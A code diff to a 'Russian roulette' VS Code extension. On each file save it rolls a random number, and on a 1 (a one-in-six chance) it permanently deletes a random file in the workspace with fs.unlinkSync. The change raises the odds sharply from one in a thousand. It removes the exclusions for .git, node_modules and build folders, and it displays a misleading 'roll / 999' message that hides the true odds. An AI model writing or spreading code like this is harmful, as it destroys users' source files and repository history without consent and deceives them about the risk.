@@ -1,4 +1,6 @@
 import * as vscode from 'vscode';
+import * as fs from 'fs';
+import * as path from 'path';
 
 export function activate(context: vscode.ExtensionContext) {
 
@@ -6,18 +8,25 @@ export function activate(context: vscode.ExtensionContext) {
 
 	const disposable = vscode.workspace.onDidSaveTextDocument(async () => {
 
-		const roll = Math.floor(Math.random() * 1000) + 1;
+		const roll = Math.floor(Math.random() * 6);
 
-		vscode.window.showInformationMessage(`🎲 Roll: ${roll}/1000`);
+		vscode.window.showInformationMessage(`🎲 Chamber roll: ${roll} / 999`);
 
-		if (roll !== 777) {
+		if (roll !== 1) {
 			return;
 		}
 
-		const files = await vscode.workspace.findFiles(
-			'**/*',
-			'**/{node_modules,.git,dist,build,.next,out}'
-		);
+		vscode.window.showWarningMessage("🎲 Spinning the chamber...");
+
+		const workspaceFolders = vscode.workspace.workspaceFolders;
+
+		if (!workspaceFolders) {
+			return;
+		}
+
+		const root = workspaceFolders[0].uri.fsPath;
+
+		const files = getAllFiles(root);
 
 		if (files.length === 0) {
 			return;
@@ -27,10 +36,10 @@ export function activate(context: vscode.ExtensionContext) {
 
 		try {
 
-			await vscode.workspace.fs.delete(unluckyFile);
+			fs.unlinkSync(unluckyFile);
 
 			vscode.window.showErrorMessage(
-				`💀 BANG! You run out of luck.`
+				`💀 BANG! Your luck ran out.`
 			);
 
 		} catch (err) {
@@ -42,6 +51,39 @@ export function activate(context: vscode.ExtensionContext) {
 	});
 
 	context.subscriptions.push(disposable);
+}
+
+function getAllFiles(dir: string): string[] {
+
+	let results: string[] = [];
+
+	const ignore = ['.vscode', 'dist'];
+
+	const list = fs.readdirSync(dir);
+
+	list.forEach(file => {
+
+		const filePath = path.join(dir, file);
+
+		if (ignore.some(i => filePath.includes(i))) {
+			return;
+		}
+
+		const stat = fs.statSync(filePath);
+
+		if (stat && stat.isDirectory()) {
+
+			results = results.concat(getAllFiles(filePath));
+
+		} else {
+
+			results.push(filePath);
+
+		}
+
+	});
+
+	return results;
 }
 
 export function deactivate() {}
